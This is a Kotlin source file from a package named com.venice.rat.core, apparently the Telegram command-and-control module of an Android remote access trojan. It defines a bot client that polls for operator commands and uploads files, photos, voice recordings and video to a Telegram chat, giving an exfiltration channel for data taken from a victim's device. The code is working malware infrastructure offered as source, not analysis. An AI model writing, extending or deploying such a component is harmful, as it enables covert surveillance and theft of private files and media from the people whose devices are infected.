package com.venice.rat.core

import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

object Tg {
    private val client = OkHttpClient.Builder()
        .connectTimeout(20, TimeUnit.SECONDS)
        .readTimeout(75, TimeUnit.SECONDS)
        .writeTimeout(300, TimeUnit.SECONDS)
        .build()

    private fun url(m: String) = Cfg.API + Cfg.BOT_TOKEN + "/" + m
    private fun mj() = "application/json".toMediaType()

    private suspend fun raw(m: String, b: RequestBody): JSONObject? = withContext(Dispatchers.IO) {
        runCatching {
            client.newCall(Request.Builder().url(url(m)).post(b).build()).execute().use {
                JSONObject(it.body?.string().orEmpty().ifBlank { "{}" })
            }
        }.getOrNull()
    }

    suspend fun j(m: String, vararg kv: Pair<String, Any?>): JSONObject? {
        val o = JSONObject()
        for ((k, v) in kv) if (v != null) o.put(k, v)
        return raw(m, o.toString().toRequestBody(mj()))
    }

    suspend fun send(chat: Long, text: String, kb: JSONObject? = null): Long? {
        val r = j("sendMessage", "chat_id" to chat, "text" to text.take(4000),
            "parse_mode" to "HTML", "reply_markup" to kb, "disable_web_page_preview" to true)
        return r?.optJSONObject("result")?.optLong("message_id")
    }

    suspend fun edit(chat: Long, id: Long, text: String, kb: JSONObject? = null) {
        j("editMessageText", "chat_id" to chat, "message_id" to id, "text" to text.take(4000),
            "parse_mode" to "HTML", "reply_markup" to kb)
    }

    suspend fun del(chat: Long, id: Long) = j("deleteMessage", "chat_id" to chat, "message_id" to id)
    suspend fun cb(id: String, text: String = "") = j("answerCallbackQuery", "callback_query_id" to id, "text" to text)

    suspend fun up(chat: Long, method: String, field: String, f: File, mime: String, cap: String? = null): Boolean =
        withContext(Dispatchers.IO) {
            runCatching {
                val b = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", chat.toString())
                if (cap != null) b.addFormDataPart("caption", cap.take(900))
                b.addFormDataPart(field, f.name, f.asRequestBody(mime.toMediaType()))
                client.newCall(Request.Builder().url(url(method)).post(b.build()).build())
                    .execute().use { it.isSuccessful }
            }.getOrDefault(false)
        }

    suspend fun photo(c: Long, f: File, cap: String? = null) = up(c, "sendPhoto", "photo", f, "image/jpeg", cap)
    suspend fun doc(c: Long, f: File, cap: String? = null) = up(c, "sendDocument", "document", f, "application/octet-stream", cap)
    suspend fun voice(c: Long, f: File, cap: String? = null) = up(c, "sendVoice", "voice", f, "audio/mp4", cap)
    suspend fun video(c: Long, f: File, cap: String? = null) = up(c, "sendVideo", "video", f, "video/mp4", cap)

    suspend fun updates(off: Long): JSONArray? = j(
        "getUpdates", "offset" to off, "timeout" to Cfg.POLL, "limit" to 100,
        "allowed_updates" to JSONArray().put("message").put("callback_query")
    )?.optJSONArray("result")
}
